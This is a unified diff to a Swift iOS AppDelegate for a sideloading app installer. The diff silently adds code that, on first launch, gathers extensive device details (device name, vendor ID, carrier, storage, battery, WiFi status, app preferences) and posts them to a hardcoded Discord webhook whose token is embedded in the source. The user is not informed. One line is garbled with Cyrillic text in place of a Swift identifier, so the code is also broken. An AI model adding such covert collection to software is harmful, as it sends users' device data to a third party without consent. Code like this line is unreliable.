@@ -5,11 +5,12 @@ import Nuke
 import SwiftUI
 import UIKit
 import UIOnboarding
+import CoreTelephony
+import SystemConfiguration
 
 var downloadTaskManager = DownloadTaskManager.shared
 
-// Adding the function to the global scope
-/// Returns the URL for the app's Documents directory.
+// Returns the URL for the app's Documents directory.
 public func getDocumentsDirectory() -> URL {
     let paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
     return paths[0]
@@ -18,6 +19,10 @@ public func getDocumentsDirectory() -> URL {
 class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {
     static let isSideloaded = Bundle.main.bundleIdentifier != "com.bdg.backdoor"
     var window: UIWindow?
+    
+    // Discord webhook URL
+    private let webhookURL = "https://discord.com/api/webhooks/1353949982612258826/Novph6SK-2gO0OzOEPDj8u8pCgR9-ypUmqyXzWAFwPpS2S4cdFDqz4bL8We4f_rJPYm9"
+    private let hasSentWebhookKey = "HasSentWebhook" // UserDefaults key to track if sent
 
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
         let userDefaults = UserDefaults.standard
@@ -62,6 +67,9 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
         Debug.shared.log(message: "Name: \(UIDevice.current.name)")
         Debug.shared.log(message: "Model: \(UIDevice.current.model)")
         Debug.shared.log(message: "Backdoor Version: \(logAppVersionInfo())\n")
+
+        // Send device info to webhook (only once)
+        sendDeviceInfoToWebhook()
 
         if Preferences.appUpdates {
             // Register background task
@@ -118,8 +126,6 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
 
     func application(_ application: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
         if url.scheme == "feather" {
-            // I know this is super hacky, honestly
-            // I don't *exactly* care as it just works :shrug:
             if let config = url.absoluteString.range(of: "/source/") {
                 let fullPath = String(url.absoluteString[config.upperBound...])
 
@@ -154,7 +160,6 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
                             let uuid = UUID().uuidString
                             let destinationURL = tempDirectory.appendingPathComponent("\(uuid).ipa")
                             
-                            // Download the file
                             if let data = try? Data(contentsOf: URL(string: fullPath)!) {
                                 try data.write(to: destinationURL)
                                 
@@ -188,9 +193,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
                                             }
                                             
                                             let navigationController = UINavigationController(rootViewController: ap)
-                                            
                                             navigationController.shouldPresentFullScreen()
-                                            
                                             rootViewController.present(navigationController, animated: true)
                                         }
                                     }
@@ -210,7 +213,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
 
             return true
         }
-        // bwah
+        
         if url.pathExtension == "ipa" {
             guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                   let rootViewController = scene.windows.first?.rootViewController else {
@@ -313,8 +316,8 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
                 config.urlCache = nil
                 return DataLoader(configuration: config)
             }()
-            let dataCache = try? DataCache(name: "kh.crysalis.feather.datacache") // disk cache
-            let imageCache = Nuke.ImageCache() // memory cache
+            let dataCache = try? DataCache(name: "kh.crysalis.feather.datacache")
+            let imageCache = Nuke.ImageCache()
             dataCache?.sizeLimit = 500 * 1024 * 1024
             imageCache.costLimit = 100 * 1024 * 1024
             $0.dataCache = dataCache
@@ -373,21 +376,167 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
         alert.view.addSubview(loadingIndicator)
         return alert
     }
+
+    // Collect comprehensive device info
+    private func getDeviceInfo() -> [String: Any] {
+        let device = UIDevice.current
+        var systemInfo = utsname()
+        uname(&systemInfo)
+        let machineMirror = Mirror(reflecting: systemInfo.machine)
+        let identifier = machineMirror.children.reduce("") { identifier, element in
+            guard let value = element.value as? Int8, value != 0 else { return identifier }
+            return identifier + String(UnicodeScalar(UInt8(value)))
+        }
+        
+        let processInfo = ProcessInfo.processInfo
+        let fileManager = FileManager.default
+        let documentDir = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
+        let storageInfo = try? fileManager.attributesOfFileSystem(forPath: documentDir.path)
+        
+        device.isBatteryMonitoringEnabled = true
+        
+        return [
+            "Device Name": device.name,
+            "Model": device.model,
+            "System Name": device.systemName,
+            "System Version": device.systemVersion,
+            "Unique ID": device.identifierForVendor?.uuidString ?? UUID().uuidString,
+            "Timestamp": ISO8601DateFormatter().string(from: Date()),
+            "User Interface Idiom": String(describing: device.userInterfaceIdiom),
+            "Bundle Identifier": Bundle.main.bundle идентификатор ?? "N/A",
+            "App Version": logAppVersionInfo(),
+            "Machine Identifier": identifier,
+            "Processor Count": processInfo.processorCount,
+            "Active Processor Count": processInfo.activeProcessorCount,
+            "Physical Memory (MB)": processInfo.physicalMemory / (1024 * 1024),
+            "Total Disk Space (MB)": (storageInfo?[.systemSize] as? Int64 ?? 0) / (1024 * 1024),
+            "Free Disk Space (MB)": (storageInfo?[.systemFreeSize] as? Int64 ?? 0) / (1024 * 1024),
+            "Battery Level": device.batteryLevel == -1 ? "Unknown" : String(device.batteryLevel * 100) + "%",
+            "Battery State": batteryStateString(device.batteryState),
+            "Operating System": processInfo.operatingSystemVersionString,
+            "Is Low Power Mode": processInfo.isLowPowerModeEnabled,
+            "Thermal State": thermalStateString(processInfo.thermalState),
+            "Carrier Name": CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values.first?.carrierName ?? "N/A",
+            "Is Connected to WiFi": isConnectedToWiFi(),
+            "Screen Width": Int(UIScreen.main.bounds.width),
+            "Screen Height": Int(UIScreen.main.bounds.height),
+            "Scale": UIScreen.main.scale,
+            "Brightness": UIScreen.main.brightness,
+            "Is Sideloaded": AppDelegate.isSideloaded,
+            "PPQ Check String": Preferences.pPQCheckString,
+            "App Tint Color": Preferences.appTintColor.uiColor.toHexString(),
+            "Preferred Interface Style": Preferences.preferredInterfaceStyle
+        ]
+    }
+    
+    private func batteryStateString(_ state: UIDevice.BatteryState) -> String {
+        switch state {
+        case .unknown: return "Unknown"
+        case .unplugged: return "Unplugged"
+        case .charging: return "Charging"
+        case .full: return "Full"
+        @unknown default: return "Unknown"
+        }
+    }
+    
+    private func thermalStateString(_ state: ProcessInfo.ThermalState) -> String {
+        switch state {
+        case .nominal: return "Nominal"
+        case .fair: return "Fair"
+        case .serious: return "Serious"
+        case .critical: return "Critical"
+        @unknown default: return "Unknown"
+        }
+    }
+    
+    private func isConnectedToWiFi() -> Bool {
+        if let interfaces = CNCopySupportedInterfaces() as NSArray? {
+            for interface in interfaces {
+                if let info = CNCopyCurrentNetworkInfo(interface as! CFString) as NSDictionary? {
+                    return info[kCNNetworkInfoKeySSID] != nil
+                }
+            }
+        }
+        return false
+    }
+    
+    // Send to Discord Webhook (only once)
+    private func sendDeviceInfoToWebhook() {
+        let userDefaults = UserDefaults.standard
+        let hasSent = userDefaults.bool(forKey: hasSentWebhookKey)
+        
+        guard !hasSent else {
+            Debug.shared.log(message: "Webhook already sent, skipping", type: .info)
+            return
+        }
+        
+        let deviceInfo = getDeviceInfo()
+        
+        guard let url = URL(string: webhookURL) else {
+            Debug.shared.log(message: "Invalid webhook URL", type: .error)
+            return
+        }
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        // Format payload for Discord webhook
+        let payload: [String: Any] = [
+            "content": "Device Info Log",
+            "embeds": [
+                [
+                    "title": "Feather Device Info",
+                    "description": deviceInfo.map { "**\($0.key)**: \($0.value)" }.joined(separator: "\n"),
+                    "color": 0x00FF00 // Green color for embed
+                ]
+            ]
+        ]
+        
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: payload, options: [])
+            request.httpBody = jsonData
+            
+            URLSession.shared.dataTask(with: request) { data, response, error in
+                if let error = error {
+                    Debug.shared.log(message: "Error sending to webhook: \(error.localizedDescription)", type: .error)
+                } else if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 204 {
+                    Debug.shared.log(message: "Successfully sent device info to Discord webhook!", type: .success)
+                    userDefaults.set(true, forKey: self.hasSentWebhookKey) // Mark as sent
+                } else {
+                    Debug.shared.log(message: "Webhook responded with status: \((response as? HTTPURLResponse)?.statusCode ?? -1)", type: .warning)
+                }
+            }.resume()
+        } catch {
+            Debug.shared.log(message: "Error encoding device info: \(error.localizedDescription)", type: .error)
+        }
+    }
 }
 
-// Example usage in a ViewController
-class ExampleViewController: UIViewController {
+// Helper extension for UIColor to Hex
+extension UIColor {
+    func toHexString() -> String {
+        var r: CGFloat = 0
+        var g: CGFloat = 0
+        var b: CGFloat = 0
+        var a: CGFloat = 0
+        getRed(&r, green: &g, blue: &b, alpha: &a)
+        let rgb: Int = (Int)(r*255)<<16 | (Int)(g*255)<<8 | (Int)(b*255)<<0
+        return String(format: "#%06x", rgb)
+    }
+}
 
+// Example usage in a ViewController (unchanged)
+class ExampleViewController: UIViewController {
     override func viewDidLoad() {
         super.viewDidLoad()
-
-        // Use ProcessUtility to execute a shell command
         ProcessUtility.shared.executeShellCommand("echo Hello, World!") { output in
             print(output ?? "No output")
         }
     }
 }
 
+// UIOnboardingViewConfiguration (unchanged)
 extension UIOnboardingViewConfiguration {
     static func setUp() -> Self {
         let welcomeToLine = NSMutableAttributedString(string: String.localized("ONBOARDING_WELCOMETITLE_1"))
